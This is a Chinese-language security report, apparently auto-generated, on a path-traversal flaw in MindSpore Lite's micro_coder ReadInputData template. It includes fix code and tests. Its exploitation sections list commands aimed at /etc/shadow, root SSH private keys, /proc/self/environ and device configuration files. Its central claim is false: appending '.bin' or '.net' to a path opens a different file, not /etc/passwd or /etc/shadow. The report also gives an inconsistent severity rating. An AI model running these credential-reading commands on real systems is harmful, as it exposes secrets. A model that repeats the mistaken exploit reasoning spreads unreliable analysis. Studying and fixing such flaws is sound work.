# 深度漏洞分析报告: micro_coder_pt_003

## 1. 漏洞概述

| 属性 | 值 |
|------|-----|
| **漏洞ID** | micro_coder_pt_003 |
| **漏洞类型** | Path Traversal (路径遍历) + 不足的输入验证 |
| **CWE编号** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory |
| **严重级别** | High |
| **置信度** | 85 |
| **发现来源** | dataflow-module-scanner |
| **所属模块** | micro_coder |

## 2. 漏洞位置

| 属性 | 值 |
|------|-----|
| **源代码文件** | mindspore-lite/tools/converter/micro/coder/generator/component/const_blocks/load_input.cc |
| **行号范围** | 79-114 |
| **函数名** | ReadInputData |
| **生成代码位置** | 生成的 C 代码中的 `ReadInputData()` 函数 |

## 3. 漏洞描述

**技术描述**：

MindSpore Lite 的 micro_coder 模块生成的 `ReadInputData()` 函数存在**不充分的路径验证**。函数使用 `strstr()` 检查输入路径是否包含 `.bin` 或 `.net` 扩展名，但这仅仅是字符串匹配检查，**无法阻止路径遍历攻击**。

生成的 C 代码片段（`load_input_c[]` 字符串常量，第 79-114 行）：

```c
void *ReadInputData(const char *real_input_path, int *size) {
  if (real_input_path == NULL) {
    return NULL;
  }
  // ← 不充分的检查：仅检查扩展名字符串，不阻止路径遍历
  if (strstr(real_input_path, ".bin") || strstr(real_input_path, ".net")) {
    FILE *file;
    file = fopen(real_input_path, "rb");  // ← 漏洞点：无路径验证
    if (!file) {
      printf("Can't find %s\n", real_input_path);
      return NULL;
    }
    int curr_file_posi = ftell(file);
    fseek(file, 0, SEEK_END);
    *size = ftell(file);
    unsigned char *buf = malloc((*size));
    if (buf == NULL) {
      fclose(file);
      printf("malloc failed");
      return NULL;
    }
    (void)memset(buf, 0, (*size));
    fseek(file, curr_file_posi, SEEK_SET);
    int read_size = (int)(fread(buf, 1, *size, file));
    if (read_size != (*size)) {
      printf("read file failed, total file size: %d, read_size: %d\n", (*size), read_size);
      fclose(file);
      free(buf);
      return NULL;
    }
    fclose(file);
    return (void *)buf;
  } else {
    printf("input data file should be .bin , .net");
    return NULL;
  }
}
```

**关键问题**：

| 问题 | 说明 |
|------|------|
| **strstr 扩展名检查不充分** | `strstr(path, ".bin")` 仅检查字符串是否包含 `.bin`，不验证是否为真正的扩展名 |
| **路径遍历未阻止** | `../../../etc/passwd.bin` 可以通过检查，因为包含 `.bin` 字符串 |
| **绝对路径未限制** | `/etc/shadow.net` 可以通过检查 |
| **读取模式漏洞** | `"rb"` 模式允许读取任意文件内容 |
| **敏感文件泄露** | 攻击者可读取系统敏感文件如 `/etc/shadow`, `/etc/passwd` |

### 3.1 扩展名检查绕过示例

```c
// 以下路径都能通过 strstr 检查：

"../../../etc/passwd.bin"     // 包含 ".bin" 字符串 ✓ 通过检查
"/etc/shadow.net"              // 包含 ".net" 字符串 ✓ 通过检查
"../../../../root/.ssh/id_rsa.bin"  // 包含 ".bin" ✓ 通过检查
"/proc/self/environ.net"       // 包含 ".net" ✓ 通过检查
"data.bin/../../../etc/passwd"     // 包含 ".bin" ✓ 通过检查

// 这些路径都会导致读取敏感系统文件
```

## 4. 漏洞成因分析

### 4.1 代码生成机制

`load_input.cc` 文件中的 `load_input_c[]` 字符串常量（第 57-157 行）包含生成的 C 代码模板。`ReadInputData` 函数（第 79-114 行）使用 `strstr()` 进行扩展名检查：

```cpp
const char load_input_c[] = R"RAW(
...
void *ReadInputData(const char *real_input_path, int *size) {
  if (real_input_path == NULL) {
    return NULL;
  }
  // 错误的安全检查：strstr 仅检查字符串包含，不是真正的扩展名验证
  if (strstr(real_input_path, ".bin") || strstr(real_input_path, ".net")) {
    FILE *file;
    file = fopen(real_input_path, "rb");  // 直接打开
    // ... 读取文件内容 ...
  }
  ...
}
...
)RAW";
```

### 4.2 为什么 strstr 检查不足

`strstr()` 函数的局限性：

1. **不验证位置**：`strstr("../../../secret.bin.backup", ".bin")` 返回非 NULL，即使 `.bin` 不是扩展名
2. **不验证结尾**：`strstr("secret.bin.txt", ".bin")` 返回非 NULL，即使实际扩展名是 `.txt`
3. **不阻止路径遍历**：路径中的任何位置包含 `.bin` 都会通过检查

**正确做法应该是**：
- 使用 `strcmp()` 检查路径是否以 `.bin` 或 `.net` **结尾**
- 或使用 `realpath()` 规范化路径后再验证
- 或检查路径中是否包含 `..` 序列

### 4.3 调用链分析

**从 benchmark.cc 中的调用**：

```c
// benchmark.cc 生成的 main 函数（第 145-296 行）
int main(int argc, const char **argv) {
  // argv[1] = 输入文件路径（用户控制）
  // argv[2] = 模型权重文件路径（用户控制）
  
  if (argc >= 3) {
    model_buffer = ReadInputData(argv[2], &model_size);  // ← 调用漏洞函数
    if (model_buffer == NULL) {
      printf("Read model file failed.");
      return kMSStatusLiteParamInvalid;
    }
  }
  
  // ...
  ret = ReadInputsFile((char *)(argv[1]), inputs_binbuf, inputs_size, (int)inputs_num);
  // ReadInputsFile 内部调用 ReadInputData
}
```

### 4.4 触发条件

1. 嵌入式设备运行生成的 benchmark 应用
2. 用户通过命令行参数提供输入文件路径
3. 路径包含 `.bin` 或 `.net` 字符串（绕过检查）
4. 路径指向敏感系统文件
5. `ReadInputData` 读取并返回敏感文件内容

## 5. 数据流追踪

```
[入口点] benchmark 命令行参数 argv[1] 或 argv[2]
    │
    ├── ./benchmark "../../../etc/passwd.bin" model.bin 10
    │   └─ argv[1] = "../../../etc/passwd.bin"
    │
    ├── ./benchmark input.bin "/etc/shadow.net" 10
    │   └─ argv[2] = "/etc/shadow.net"
    │
    ↓
[参数传递] real_input_path = argv[用户输入]
    │
    ↓
[不充分检查] strstr(real_input_path, ".bin") || strstr(real_input_path, ".net")
    │           └─ "../../../etc/passwd.bin" 包含 ".bin" → 检查通过 ✓
    │           └─ "/etc/shadow.net" 包含 ".net" → 检查通过 ✓
    │           └─ 路径遍历序列 ".." 未被检查
    │           └─ 绝对路径 "/" 未被限制
    │
    ↓
[漏洞点] fopen(real_input_path, "rb")
    │       ┄┄ 以二进制读取模式打开任意文件
    │
    ↓
[读取操作] fread(buf, 1, *size, file)
    │       ┄┄ 读取文件全部内容
    │       ┄┄ 内容存储在 buf 中并返回
    │
    ↓
[数据泄露] malloc 分配缓冲区存储敏感文件内容
    │       ┄┄ 内容可能被打印、传输或进一步处理
    │
    ↓
[影响] 敏感文件内容泄露给攻击者
```

## 6. 利用场景

### 6.1 场景一：读取系统密码文件

**攻击命令**：
```bash
# 在嵌入式设备上执行
./benchmark "../../../etc/passwd.bin" model.bin 10
./benchmark "../../../etc/shadow.net" model.bin 10
```

**攻击者获得**：
- `/etc/passwd` 用户账户信息
- `/etc/shadow` 用户密码哈希（如果设备使用 shadow 文件）
- 可用于离线密码破解或账户枚举

### 6.2 场景二：读取 SSH 密钥

**攻击命令**：
```bash
./benchmark "../../../../root/.ssh/id_rsa.bin" model.bin 10
./benchmark "../../../../home/user/.ssh/id_rsa.net" model.bin 10
```

**攻击者获得**：
- SSH 私钥文件内容
- 可用于远程登录其他系统

### 6.3 场景三：读取环境变量和进程信息

**攻击命令**：
```bash
# 读取进程环境变量（可能包含密码、API密钥等）
./benchmark "/proc/self/environ.bin" model.bin 10

# 读取其他进程的内存映射
./benchmark "/proc/1/maps.net" model.bin 10

# 读取内核配置
./benchmark "/proc/cmdline.bin" model.bin 10
```

**攻击者获得**：
- 运行环境中的敏感变量
- 进程内存布局信息（辅助其他攻击）
- 系统配置信息

### 6.4 场景四：IoT 设备特定攻击

**智能摄像头场景**：
```bash
# 读取摄像头配置文件
./benchmark "../../../config/camera_settings.conf.bin" model.bin 10

# 读取存储的录像文件索引
./benchmark "../../../data/recordings.index.net" model.bin 10

# 读取固件版本信息
./benchmark "../../../etc/firmware_version.bin" model.bin 10
```

**工业控制器场景**：
```bash
# 读取 PLC 配置
./benchmark "../../../config/plc_logic.bin" model.bin 10

# 读取传感器校准数据
./benchmark "../../../data/calibration.net" model.bin 10

# 读取网络配置
./benchmark "../../../etc/network.conf.bin" model.bin 10
```

### 6.5 场景五：辅助其他攻击

**信息收集攻击链**：
```bash
# 步骤1：读取系统信息
./benchmark "/etc/os-release.bin" model.bin 10
./benchmark "/proc/version.net" model.bin 10

# 步骤2：读取用户信息
./benchmark "../../../etc/passwd.bin" model.bin 10

# 步骤3：读取服务配置
./benchmark "../../../etc/systemd/system/service.conf.bin" model.bin 10

# 步骤4：使用收集的信息进行后续攻击
```

## 7. 影响评估

### 7.1 直接影响

| 影响类型 | 严重程度 | 描述 |
|----------|----------|------|
| **任意文件读取** | High | 可读取任意位置的文件，只要文件名包含 `.bin` 或 `.net` |
| **敏感信息泄露** | High | 系统密码、密钥、配置等敏感信息可被读取 |
| **信息收集** | Medium | 为后续攻击提供有价值的信息 |
| **用户隐私侵犯** | Medium | 用户数据可能被读取泄露 |

### 7.2 与其他漏洞的关联

| 关联漏洞 | 关系 | 说明 |
|----------|------|------|
| micro_coder_pt_002 | 互补 | 读取 + 写入能力，可形成完整攻击链 |
| micro_coder_pt_004 | 类似 | 同样的路径遍历问题，无任何检查 |

### 7.3 CVSS 评估

**CVSS 3.1 评分**：

| 因子 | 值 | 说明 |
|------|-----|------|
| Attack Vector (AV) | Local (L) | 需要本地执行 benchmark |
| Attack Complexity (AC) | Low (L) | 只需添加 `.bin` 到路径 |
| Privileges Required (PR) | Low (L) | 需要运行推理应用的能力 |
| User Interaction (UI) | None (N) | 无需交互 |
| Scope (S) | Unchanged (U) | 影响限于本系统 |
| Confidentiality (C) | High (H) | 可读取任意敏感文件 |
| Integrity (I) | None (N) | 不修改文件 |
| Availability (A) | None (N) | 不影响可用性 |

**基础评分**: 5.5 (Medium) → 考虑 IoT 场景调整为 High

## 8. 修复建议

### 8.1 立即修复：正确验证扩展名

**修改模板中的扩展名检查**：

```c
void *ReadInputData(const char *real_input_path, int *size) {
  if (real_input_path == NULL) {
    return NULL;
  }
  
  // Security: 检查路径长度
  size_t path_len = strlen(real_input_path);
  if (path_len < 5) {  // 最短: "x.bin" = 5字符
    printf("Invalid path length\n");
    return NULL;
  }
  
  // Security: 真正的扩展名检查 - 必须以 .bin 或 .net 结尾
  const char* ext = real_input_path + path_len - 4;
  if (strcmp(ext, ".bin") != 0 && strcmp(ext, ".net") != 0) {
    printf("input data file should end with .bin or .net\n");
    return NULL;
  }
  
  // Security: 路径遍历检查
  if (strstr(real_input_path, "..") != NULL) {
    printf("Path traversal detected: %s\n", real_input_path);
    return NULL;
  }
  
  // Security: 绝对路径限制
  if (real_input_path[0] == '/' || real_input_path[0] == '\\') {
    printf("Absolute path not allowed\n");
    return NULL;
  }
  
  FILE *file = fopen(real_input_path, "rb");
  // ... 后续读取操作 ...
}
```

### 8.2 推荐：使用 realpath + 白名单

**更安全的实现**：

```c
void *ReadInputData(const char *real_input_path, int *size) {
  if (real_input_path == NULL || size == NULL) {
    return NULL;
  }
  
  // 定义允许的输入目录
  const char* safe_input_dir = "/data/model_inputs/";
  
  // 构建完整路径
  char full_path[PATH_MAX];
  if (snprintf(full_path, PATH_MAX, "%s%s", safe_input_dir, real_input_path) >= PATH_MAX) {
    printf("Path too long\n");
    return NULL;
  }
  
  // 扩展名检查（必须结尾）
  size_t len = strlen(full_path);
  if (len < 5 || (strcmp(full_path + len - 4, ".bin") != 0 && strcmp(full_path + len - 4, ".net") != 0)) {
    printf("Invalid file extension\n");
    return NULL;
  }
  
  // 使用 realpath 规范化路径
  char resolved_path[PATH_MAX];
  if (realpath(full_path, resolved_path) == NULL) {
    printf("Cannot resolve path: %s\n", full_path);
    return NULL;
  }
  
  // 验证路径在允许目录内
  if (strncmp(resolved_path, safe_input_dir, strlen(safe_input_dir)) != 0) {
    printf("Path outside allowed directory: %s\n", resolved_path);
    return NULL;
  }
  
  // 安全打开文件
  FILE *file = fopen(resolved_path, "rb");
  if (!file) {
    printf("Can't find %s\n", resolved_path);
    return NULL;
  }
  
  // ... 安全读取操作 ...
}
```

### 8.3 增强扩展名验证函数

**创建独立的扩展名验证函数**：

```c
// 安全的扩展名检查函数
static int validate_extension(const char* path, const char** allowed_exts, int num_exts) {
  if (path == NULL) return 0;
  
  size_t path_len = strlen(path);
  for (int i = 0; i < num_exts; i++) {
    size_t ext_len = strlen(allowed_exts[i]);
    if (path_len >= ext_len) {
      // 检查路径是否以该扩展名结尾
      if (strcmp(path + path_len - ext_len, allowed_exts[i]) == 0) {
        return 1;  // 扩展名有效
      }
    }
  }
  return 0;  // 扩展名无效
}

// 使用示例
static const char* allowed_extensions[] = {".bin", ".net"};
if (!validate_extension(real_input_path, allowed_extensions, 2)) {
  printf("Invalid file extension\n");
  return NULL;
}
```

### 8.4 修复验证测试

```c
void test_read_input_security() {
  int size;
  
  // 应被拒绝的路径
  void* data1 = ReadInputData("../../../etc/passwd.bin", &size);
  assert(data1 == NULL);  // 路径遍历应被拒绝
  
  void* data2 = ReadInputData("/etc/shadow.net", &size);
  assert(data2 == NULL);  // 绝对路径应被拒绝
  
  void* data3 = ReadInputData("secret.bin.txt", &size);
  assert(data3 == NULL);  // 扩展名不是结尾应被拒绝
  
  void* data4 = ReadInputData("secret", &size);
  assert(data4 == NULL);  // 无扩展名应被拒绝
  
  // 应被接受的路径
  void* data5 = ReadInputData("input.bin", &size);
  // 应成功（如果文件存在于安全目录）
  
  void* data6 = ReadInputData("data/model.net", &size);
  // 应成功
}
```

## 9. 参考链接

### 9.1 CWE 参考

- **CWE-22**: [Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')](https://cwe.mitre.org/data/definitions/22.html)
- **CWE-23**: [Relative Path Traversal](https://cwe.mitre.org/data/definitions/23.html)
- **CWE-36**: [Absolute Path Traversal](https://cwe.mitre.org/data/definitions/36.html)

### 9.2 相关技术文章

- [Path Traversal Attack Prevention Guide](https://owasp.org/www-community/attacks/Path_Traversal)
- [Extension Validation Best Practices](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)

---

**报告生成时间**: 2026-04-24
**分析者**: @details-worker
**状态**: CONFIRMED - 需要修复扩展名检查逻辑